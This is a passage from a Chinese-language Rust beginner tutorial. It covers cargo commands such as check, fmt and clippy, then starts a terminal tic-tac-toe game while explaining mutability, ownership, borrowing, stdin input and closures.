check</code>应该是使用频率最高的命令之一，无他，谁不愿意在写代码的时候有一个帮手能帮你检查代码呢。check命令就是会对你的rust代码做亿点点检查，如果你写的问题，还会贴心的给予你提示。</p><p>比如：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// path: src/main.rs</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">a</span> = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>check一下看看</p><p><img src="/Rust-QuickStart/image-20231126150439479.png" alt="check_a"></p><p>警告了你a这个变量没有使用，并且给了你提示，可以在变量名前面加一个下划线，这样编译器就不会警告这个值，当然这个值还是可以使用的。check的功能远不止这些，得要靠自己探索了：D</p><p><strong>fmt</strong></p><p>rust又一大杀器，除了可以帮你控制代码缩进，还可以帮你的代码书写风格变得更加rusty！</p><p>比如：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// path: src/main.rs</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">s</span> = <span class="type">String</span>::<span class="title function_ invoke__">new</span>();</span><br><span class="line">        std::io::<span class="title function_ invoke__">stdin</span>().<span class="title function_ invoke__">read_line</span>(&amp;<span class="keyword">mut</span> s).<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">nums</span> = s.<span class="title function_ invoke__">trim</span>().<span class="title function_ invoke__">split_whitespace</span>().<span class="title function_ invoke__">map</span>(|x| x.parse::&lt;<span class="type">usize</span>&gt;().<span class="title function_ invoke__">unwrap</span>()).collect::&lt;<span class="type">Vec</span>&lt;<span class="type">usize</span>&gt;&gt;();</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">println!</span>(<span class="string">&quot;&#123;:?&#125;&quot;</span>, nums);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行<code>cargo fmt</code>后</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">s</span> = <span class="type">String</span>::<span class="title function_ invoke__">new</span>();</span><br><span class="line">    std::io::<span class="title function_ invoke__">stdin</span>().<span class="title function_ invoke__">read_line</span>(&amp;<span class="keyword">mut</span> s).<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">nums</span> = s</span><br><span class="line">        .<span class="title function_ invoke__">trim</span>()</span><br><span class="line">        .<span class="title function_ invoke__">split_whitespace</span>()</span><br><span class="line">        .<span class="title function_ invoke__">map</span>(|x| x.parse::&lt;<span class="type">usize</span>&gt;().<span class="title function_ invoke__">unwrap</span>())</span><br><span class="line">        .collect::&lt;<span class="type">Vec</span>&lt;<span class="type">usize</span>&gt;&gt;();</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;&#123;:?&#125;&quot;</span>, nums);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>是不是看的舒服多了，所以再也不用担心重构时一堆缩进问题的（bushi</p><p><strong>clippy</strong></p><p>check + fmt + clippy大概就是写代码过程中最常用的3件套了，写rs嘎嘎爽~</p><p>clippy类似于check，会对你的代码做一些常见错误的检查，同时也像命令描述中说的，improve your Rust code！</p><p>对上面那段代码分别运行check和clippy对比看看</p><p><img src="/Rust-QuickStart/image-20231126151919640.png" alt="check_and_clippy"></p><p>发现check没有发现语法问题，所以没有任何信息抛出；而clippy则是在语法层面提供了一个简单的优化方案，比如这里提示在<code>.split_whitespace()</code>前不需要使用<code>.trim()</code>， 后面其实还有一个提示说可以用clippy帮你改，不用手动改。我们运行一下<code>cargo clippy --fix --bin &#39;hello&#39; --allow-dirty</code>， 再回去看我们的源代码，果然<code>.trim()</code>已经被去除了。</p><p><strong>others</strong></p><p>还有一些不是那么的常用但是也很有用的命令，这里简单列一下：</p><ul><li><code>cargo add</code>  可以把指定的依赖添加到当前项目，比如<code>cargo add regex</code>，就可以把regex库添加到当前项目，使用cargo add会修改你的Cargo.toml文件，默认添加的是最新版本，也可以指定它的版本和feature啥的。当然你也可以直接修改cargo.toml文件来达到一样的效果</li><li><code>cargo remove</code> 于cargo add对应，就是把指定的依赖从当前项目去除</li><li><code>cargo --version</code> 查看cargo的版本，包括是stable还是nightly</li><li><code>cargo install</code> 看起来和add很像，不过install命令是安装二进制文件的，比如运行<code>cargo install tauri-cli</code>，然后你就可以使用<code>cargo tauri</code> 命令来构建你的tauri项目：D</li><li><code>cargo clean</code> 这是和build一对的，clean用来删除<code>./target</code>文件夹</li><li><code>cargo search</code> 可以在crates.io查找指定的crate，<del>记得科学上网</del>，要不然可能有亿点点慢：(</li><li><strong>……</strong></li></ul><h1 id="Quick-Start-with-a-small-Game"><a href="#Quick-Start-with-a-small-Game" class="headerlink" title="Quick Start with a small Game"></a>Quick Start with a small Game</h1><h2 id="Create-your-Tic-tac-toe"><a href="#Create-your-Tic-tac-toe" class="headerlink" title="Create your Tic-tac-toe"></a>Create your Tic-tac-toe</h2><p>通过一个小项目来快速上手可能是一个好方法。</p><p>先找一个你觉得比较舒服的地方，然后通过cargo来创建一个新项目，并且进入项目文件夹</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cargo new tic<span class="literal">-tac-toe</span></span><br><span class="line"><span class="built_in">cd</span> tic<span class="literal">-tac-toe</span></span><br></pre></td></tr></table></figure><p>现在你位于当前项目的根目录，你需要确保你的终端的当前目录在项目文件夹内，以便cargo可以定位到你的 <code>cargo.toml</code> 文件，除此之外在根目录还是在其他目录（比如<code>src/</code> 或者 <code>target/</code> 等）没有影响</p><p>好！现在你可以使用一个编辑器来打开main.rs文件准备编写项目了！</p><h2 id="Start-with-putting-something"><a href="#Start-with-putting-something" class="headerlink" title="Start with putting something"></a>Start with putting something</h2><p>哪怕是终端，交互也是必不可少的，几乎任何语言的教程教你写的第一句代码都十分默契的选择了 Hello, World! <del>（当然在这里我们不是要输出这句话就是了）</del></p><p>打开你的rs源文件，它应该位于<code>src/main.rs</code>， 会发现里面已经有内容了，那么如果仔细观察会发现使用的输出<del>函数</del> <code>println!()</code> 带有一个！，按理说<code>!</code>属于非法命名，在rs当然也一样，只是因为这个<code>!</code>不是包含在名字内的罢了，另外，println！不是一个函数，而是<strong>宏</strong></p><blockquote><p>  在rust里，带有！的就是宏了，比如 print!, println!, write!等，我们这里暂时先不谈宏，只要知道是用来输出的就行了</p></blockquote><p>把main函数里面清空，并写上这句话</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;Welcome to Rust Tic Tac Toe!&quot;</span>);</span><br></pre></td></tr></table></figure><p>记得运行一下确保能看到输出这句话：D</p><h2 id="Game-initialize"><a href="#Game-initialize" class="headerlink" title="Game initialize"></a>Game initialize</h2><p>细想一个井字棋需要些什么，嗯哼~，我想需要一个棋盘，两个玩家，当然还有配套的一系列判定系统。那我们就先看棋盘吧！</p><p>棋盘显然是一个3x3的，我们可以选择创建一个3x3的二维数组，或者长度为9的一维数组。这里为了更加符合直觉，我选择了前者。</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">board</span>: [[<span class="type">char</span>; <span class="number">3</span>]; <span class="number">3</span>] = [[<span class="string">&#x27; &#x27;</span>; <span class="number">3</span>]; <span class="number">3</span>];</span><br></pre></td></tr></table></figure><p>在rust中你可以使用let来把一个值绑定到一个变量，如果你写过JavaScript，应该会比较亲切：D， 一个标准的用法就是<code>let 变量名: 类型 = 表达式;</code>， 这里由于rust有强大的类型推导系统，所以你可以不用写名类型，编译器会自动推导出来！所以虽然是强类型语言，但是也不用像C&#x2F;Cpp在创建变量时必须注明类型。</p><p>我们再来看看这个类型，是一个嵌套的数组，在rust里面数组是<strong>固定长度</strong>的，也就是说你在声明时<strong>必须显示的标注长度</strong>， 这就导致，哪怕数组内部每个元素的类型相同，长度不同的话也是不同类型，<strong>比如 <code>[u32; 3]</code> 和 <code>[u32; 4]</code>就是两个不同的类型！</strong></p><p>右边的表达式就和类型长得差不多，只要把数组里面的类型替换成对于类型的某个具体值就行了，像这里就是使用了空格来初始化这个数组。</p><blockquote><p>  不是所有类型都可以作为数组的元素，除非实现Copy trait， copy特征简单来说就是能够快速拷贝，性能开销非常的小，一般储存在栈上的数据都默认实现了Copy特征；而像String这种在堆上的数据，无法实现Copy特征（但是实现了Clone特征，可以用.clone()来复制一份），所以不能作为数组的元素，像 [String; 3]，这种类型是不被允许的</p></blockquote><p>那么地图就这么弄好了，我们每下一步，就只要把数组对应位置的char换成我们下的字符。</p><p>比如我们假定玩家使用 ‘X’ 和 ‘O’， X先手。我们先来测试一下吧</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">board[<span class="number">0</span>][<span class="number">0</span>] = <span class="string">&#x27;X&#x27;</span>;</span><br></pre></td></tr></table></figure><p>ok， 非常完美！直接cargo run 运行一手</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">   Compiling playground v0.<span class="number">0.1</span> (/playground)</span><br><span class="line">error[<span class="type">E0594</span>]: cannot assign to `board[<span class="type">_</span>][<span class="type">_</span>]`, as `board` is not declared as mutable</span><br><span class="line"> <span class="literal">--</span>&gt; src/main.rs:<span class="number">3</span>:<span class="number">5</span></span><br><span class="line">  |</span><br><span class="line"><span class="number">3</span> |     board[<span class="number">0</span>][<span class="number">0</span>] = <span class="string">&#x27;X&#x27;</span>;</span><br><span class="line">  |     ^^^^^^^^^^^^^^^^^ cannot assign</span><br><span class="line">  |</span><br><span class="line">help: consider changing this to be mutable</span><br><span class="line">  |</span><br><span class="line"><span class="number">2</span> |     let mut board: [[<span class="built_in">char</span>; <span class="number">3</span>]; <span class="number">3</span>] = [[<span class="string">&#x27; &#x27;</span>; <span class="number">3</span>]; <span class="number">3</span>];</span><br><span class="line">  |         +++</span><br><span class="line"></span><br><span class="line"><span class="keyword">For</span> more information about this error, <span class="keyword">try</span> `rustc <span class="literal">--explain</span> E0594`.</span><br><span class="line">error: could not compile `playground` (bin <span class="string">&quot;playground&quot;</span>) due to previous error</span><br></pre></td></tr></table></figure><p>Oh no! 报错了，编译器提醒我们board没有被声明为可变，所以不能再次分配值给<code>board[_][_]</code>， 当然还贴心的给你了提示，在board前面加一个mut关键字即可</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">board</span>: [[<span class="type">char</span>; <span class="number">3</span>]; <span class="number">3</span>] = [[<span class="string">&#x27; &#x27;</span>; <span class="number">3</span>]; <span class="number">3</span>];</span><br><span class="line">board[<span class="number">0</span>][<span class="number">0</span>] = <span class="string">&#x27;X&#x27;</span>;</span><br></pre></td></tr></table></figure><p>运行一下，编译通过！</p><blockquote><p>  在rust中用let来声明一个变量默认是不可变的，如果你想要能在后面改变它的值，你必须用 mut 关键字来显示的声明为一个可变变量，当然你也可以重新用let来绑定，比如你可以像这样：</p>  <figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">a</span> = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">let</span> <span class="variable">a</span> = a + <span class="number">1</span>;</span><br></pre></td></tr></table></figure></blockquote><p>然后我们可以加一个current_player来记录当前的玩家，和一个input来储存你每次的输入，目前的main应该大概是这样的：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;Welcome to Rust Tic Tac Toe!&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">board</span> = [[<span class="string">&#x27; &#x27;</span>; <span class="number">3</span>]; <span class="number">3</span>];</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">current_player</span> = <span class="string">&#x27;X&#x27;</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">input</span> = <span class="type">String</span>::<span class="title function_ invoke__">new</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们调用了String类的new方法来申请了一块内存来储存我们的字符串，当然现在还没有读入东西，还是空的。</p><p>ok，记得运行确保你的代码是正确的</p><h2 id="Game-Update"><a href="#Game-Update" class="headerlink" title="Game Update"></a>Game Update</h2><p>接下来就要构建我们游戏的主要逻辑了，我们肯定要放在一个循环里面，然后当有人获胜，或者棋盘被填满（平局）就退出游戏。那么我们的每次循环要做些什么呢？</p><p>首先我们肯定要输出我们的棋盘，不可能盲下吧:cry:， 我们不妨创建一个函数来在每次循环进行调用。</p><p>我们先创建一个循环，这里我比较倾向使用 loop，当然你也可以用while true（如果使用while true，编译器应该会给你一个warning，并建议你改成loop）</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">loop</span> &#123;</span><br><span class="line">    <span class="comment">// todo</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>loop支持常用的流程控制如break等，这跟大部分语言差不多，不做赘述。</p><h3 id="Definite-a-function-to-put-chessboard"><a href="#Definite-a-function-to-put-chessboard" class="headerlink" title="Definite a function to put chessboard"></a>Definite a function to put chessboard</h3><p>如果仔细观察过main函数，应该可以猜得出来声明一个函数要使用 <code>fn</code> 关键字，其具体的格式是 <code>fn 函数名&lt;特征和生命周期&gt;(参数名1: 参数类型1, ...) -&gt; 返回值类型 &#123;&#125;</code> ， 特征和生命周期先不用管后面再说，如果不注明特征约束或者生命周期，尖括号的部分是可以省略的，就像main一样函数名后面直接就是圆括号了。那我们就照猫画虎的先写一个函数看看吧！</p><blockquote><p>  注意函数的类型标注不能省略</p></blockquote><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">print_board</span>(board: &amp;[[<span class="type">char</span>; <span class="number">3</span>]; <span class="number">3</span>]) &#123;</span><br><span class="line">    <span class="comment">// todo</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于我们只需要输出，所以可以不用返回值，当然实际上是有返回值的，这个函数返回的是一个空元组，或者说是一个单元类型，它长这样 <code>()</code> ， 它可以忽略掉，当然如果你写上 <code>-&gt; () </code> 也不会错。</p><p>这个函数只有一个参数board，类型是一个 3x3的char数组的引用，一般来说，我们定义一个函数如果要传入一个复杂类型的参数，我们一般采用传入一个引用的形式，这会涉及到所有权的知识。</p><blockquote><p>  <strong>所有权和借用</strong>是Rust的一个非常重要的内容。对于内存管理，相信大家都很熟悉GC（比如Java，GO）和手动管理内存的分配和释放（比如C&#x2F;Cpp），而所有权是不同与前2种流派的第三种流派，它会在编译期就根据一系列规则进行检查，因此对于运行期不会有任何性能上的损失。</p><p>  这里因为篇幅关系不便详谈，简单来说所有权有以下几条规则：</p><p>  1）Rust中的每个值都被一个变量所拥有，该变量被称为值的所有者；</p><p>  2）一个值同时只能被一个变量所拥有；</p><p>  3）当所有者（变量）离开作用域范围时，这个值将被丢弃（drop）</p><p>  以String为例，它是被分配到堆上的数据，所以没有实现Copy特征，那么如果我执行了如下代码</p>  <figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">s1</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;Test_string&quot;</span>);</span><br><span class="line"><span class="keyword">let</span> <span class="variable">s2</span> = s1;</span><br><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, s2);</span><br><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, s1);</span><br></pre></td></tr></table></figure><p>  这段代码会报错，因为let s2 &#x3D; s1 的时候，s1的值的所有权被转移给了s2了，所以后面不能调用s1了</p><p>  这里可以把第二行改成 <code>let s2 = &amp;s1;</code> ，这样s2就是s1的值的一个引用（就相当于你借来用用，但是不具有它的所有权）就可以正常运行；或者改为 <code>let s2 = s1.clone();</code>， String实现了clone特征，所以可以调用clone方法来复制一份，注意这会在堆上再申请一块内存，所以使用clone会有一点的性能开销。但是如果我们把这段代码改成：</p>  <figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">s1</span> = <span class="number">0x114514</span>;</span><br><span class="line"><span class="keyword">let</span> <span class="variable">s2</span> = s1;</span><br><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;&#123;:x&#125;&quot;</span>, s2);</span><br><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;&#123;:x&#125;&quot;</span>, s1);</span><br></pre></td></tr></table></figure><p>  运行发现可以正常输出两行114514，这是因为整型是基本类型，默认实现了Copy特征，可以进行快速拷贝，let s2的时候就是把s1的值拷贝了一份然后在栈上的另一个地方开一块空间存放0x114514作为s2，和上一个例子相比较发现copy和clone都是把值复制了一遍在另外找一块空间来存放，区别就是一个在堆上，一个在栈上。</p></blockquote><p>好，话说回来，我们该写这个函数的具体逻辑了。其实只要简单的遍历以下board的每个值就可以吧，当然为了好看，我们可以加一个边框，像这样：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">print_board</span>(board: &amp;[[<span class="type">char</span>; <span class="number">3</span>]; <span class="number">3</span>]) &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;+---+---+---+&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> <span class="variable">row</span> <span class="keyword">in</span> board &#123;</span><br><span class="line">        <span class="built_in">print!</span>(<span class="string">&quot;| &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> <span class="variable">col</span> <span class="keyword">in</span> row &#123;</span><br><span class="line">            <span class="built_in">print!</span>(<span class="string">&quot;&#123;&#125; | &quot;</span>, col);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;\n+---+---+---+&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在main里面添加 <code>print_board(&amp;board);</code>， 运行一下，输出的应该是这样：（我在<a href="https://play.rust-lang.org/%E8%BF%90%E8%A1%8C%E7%9A%84%EF%BC%89">https://play.rust-lang.org/运行的）</a></p><p><img src="/Rust-QuickStart/image-20231128185424273.png" alt="board"></p><p>这里我用了两个for来遍历数组，rust的for是类似与python这类语言的for，是遍历一个迭代器的值，而不是简单的遍历索引。</p><blockquote><p>  当然如果想要像c一样或者像python的for i in range(n)这种当然也可以，像这样就可以。</p>  <figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> <span class="variable">idx</span> <span class="keyword">in</span> <span class="number">0</span>..<span class="number">10</span> &#123;&#125;</span><br></pre></td></tr></table></figure><p>  要注意0..10类似python的range是左取又不取的，如果你想要从0遍历到10，可以 0..11, 或者 0..&#x3D;10</p></blockquote><p><strong>注意for不支持给迭代的变量标注类型</strong>，也就是说比如 <code>for row: &amp;[char; 3] in board &#123;...&#125;</code> 这种是不被允许的！当然也无须担心，因为编译器会自动推导出类型！</p><h3 id="Receive-input-and-Process-it"><a href="#Receive-input-and-Process-it" class="headerlink" title="Receive input and Process it"></a>Receive input and Process it</h3><p>你可能期待rust的输入可以像c&#x2F;cpp的scanf&#x2F;fread，或者python的input()一样，可以直接调用一个函数来获取终端输入。但是很遗憾，rust并不直接存在这么一个函数，或者说，它被封装在Stdin类下，比如最常见的是<code>.read_line()</code></p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">stdin</span> = std::io::<span class="title function_ invoke__">stdin</span>();</span><br><span class="line">stdin.<span class="title function_ invoke__">read_line</span>(&amp;<span class="keyword">mut</span> input).<span class="title function_ invoke__">unwrap</span>();</span><br></pre></td></tr></table></figure><p>这样就会从终端中读取一行（包括换行符）拼接在input结尾处，所以在循环中我们必须在每次开头都清空一下input中的内容。你需要在read_line的上一行插入：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">input.<span class="title function_ invoke__">clear</span>();</span><br></pre></td></tr></table></figure><p>需要注意：clear和read_line都是改变input的值，所以我们需要在声明input的时候添加mut关键字使其可变，而 <code>&amp;mut input</code> 是input的可变引用，它也是一种引用，不具有所有权，但是具有其使用权和更改权限，所以可以对input本身进行更改。</p><blockquote><p>  <strong>一个变量最多只能有一个可变引用，并且有可变引用时，不允许存在不可变引用，也不能通过所有者来访问值</strong></p><p>  来看这段代码</p>  <figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">a</span> = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">let</span> <span class="variable">b</span> = &amp;<span class="keyword">mut</span> a;</span><br><span class="line">*b += <span class="number">1</span>;</span><br><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125; &#123;&#125;&quot;</span>, a, b);</span><br></pre></td></tr></table></figure><p>  运行后果不其然报错了</p>  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">error[<span class="type">E0502</span>]: cannot borrow `a` as immutable because it is also borrowed as mutable</span><br><span class="line"> <span class="literal">--</span>&gt; src/main.rs:<span class="number">5</span>:<span class="number">23</span></span><br><span class="line">  |</span><br><span class="line"><span class="number">3</span> |     let b = &amp;mut a;</span><br><span class="line">  |             <span class="literal">------</span> mutable borrow occurs here</span><br><span class="line"><span class="number">4</span> |     *b += <span class="number">1</span>;</span><br><span class="line"><span class="number">5</span> |     println!(<span class="string">&quot;&#123;&#125; &#123;&#125;&quot;</span>, a, b);</span><br><span class="line">  |                       ^  - mutable borrow later used here</span><br><span class="line">  |                       |</span><br><span class="line">  |                       immutable borrow occurs here</span><br><span class="line">  |</span><br><span class="line">  = note: this error originates <span class="keyword">in</span> the macro `$crate::format_args_nl` which comes from the expansion of the macro `println` (<span class="keyword">in</span> Nightly builds, run with <span class="literal">-Z</span> macro<span class="literal">-backtrace</span> <span class="keyword">for</span> more info)</span><br><span class="line"></span><br><span class="line"><span class="keyword">For</span> more information about this error, <span class="keyword">try</span> `rustc <span class="literal">--explain</span> E0502`.</span><br></pre></td></tr></table></figure><p>  可以这么来想，A有一个PS，B借过来玩（可变引用），B在玩的过程中（B的作用范围没有结束），A（所有者）和其他人（其他借用）显然不能借走吧，除非B还回去（B的作用结束），这样就回到A手上了，A又可以继续玩（A可以访问或修改值了）</p><p>  如果把上面那段改成这样就Ok了</p>  <figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">a</span> = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">let</span> <span class="variable">b</span> = &amp;<span class="keyword">mut</span> a;<span class="comment">// 可变借用 b 作用域开始</span></span><br><span class="line">*b += <span class="number">1</span>; <span class="comment">/* ps: *是解引用，因为b是&amp;i32, 没有实现+=，所以要解引用对值本身+= */</span></span><br><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, b);<span class="comment">// b 作用域结束，因为后面都没有再使用b了</span></span><br><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, a);<span class="comment">// b 作用结束后值的使用权自动还给a，所以a可以输出</span></span><br></pre></td></tr></table></figure><p>  建议自己写写尝试一下：D</p></blockquote><p>那么read_line后面的 <code>.unwrap()</code> 是干嘛的呢，你可能会有这种疑问。</p><p>其实功能就像字面意思那样，“拆开”，这里因为read_line，返回的是一个Result，而result需要手动处理，所以这里就用unwrap来取出里面的值</p><blockquote><p>  Result是一个枚举类型，定义是这样的</p>  <figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">enum</span> <span class="title class_">Result</span>&lt;T, E&gt; &#123;</span><br><span class="line">    <span class="title function_ invoke__">Ok</span>(T),</span><br><span class="line">    <span class="title function_ invoke__">Err</span>(E),</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  这里T，E都是泛型，一般T是一个你期望的值，E是一个错误。当unwrap遇到Ok时就会正常取出值，而如果是Err，就会<code>panic!</code> ，然后你就发现程序崩溃并且输出了一堆奇奇怪怪的东西。</p><p>  一般返回result就是让你自己来错误处理，常常会配合match之类的。在后面讲错误处理的时候再说：D</p></blockquote><p>哦，差点忘记了，我们需要些什么数据好像还没说。不如输入的格式就是 <code>row col</code>吧。所以我们在输入之前加上一条说明。</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">print_board</span>(&amp;board);</span><br><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;Please input your move: (fmt: row col)&quot;</span>);</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure><p>然后我们得要把行列数据提取出来，我们可以使用split_whitespace，它会去掉空格、tab、回车之类的字符，并且会由此把其他可见字符字串隔开，返回的是一个迭代器。</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">input</span> = input</span><br><span class="line">.<span class="title function_ invoke__">split_whitespace</span>()</span><br><span class="line">.<span class="title function_ invoke__">map</span>(|x| x.parse::&lt;<span class="type">usize</span>&gt;().<span class="title function_ invoke__">unwrap</span>())</span><br><span class="line">.collect::&lt;<span class="type">Vec</span>&lt;<span class="type">usize</span>&gt;&gt;();</span><br><span class="line"><span class="keyword">let</span> <span class="variable">row</span> = input[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">let</span> <span class="variable">col</span> = input[<span class="number">1</span>];</span><br></pre></td></tr></table></figure><blockquote><p>  map其实功能就是你们印象的那个map，在rust里，只要实现了迭代器特征的类型就可以调用map方法，map接收一个闭包作为参数，如果你用过一些函数式语言可能会比较熟悉 “闭包” 这个概念，其实它就是类似lambda的东西，其具体的形式是接近Ruby语言的闭包的。</p><p>  <code>||</code> 里面的是入参，闭包会自动把捕获的值绑定到里面的变量，你可以标注类型，但是同样也没必要这样做，因为编译器会自动推导！<code>||</code> 后面是一个表达式，这也意味着，你可以在 {} 中写多行代码，而不用像python的lambda一样只能想办法把表达式压缩到一行</p><p>  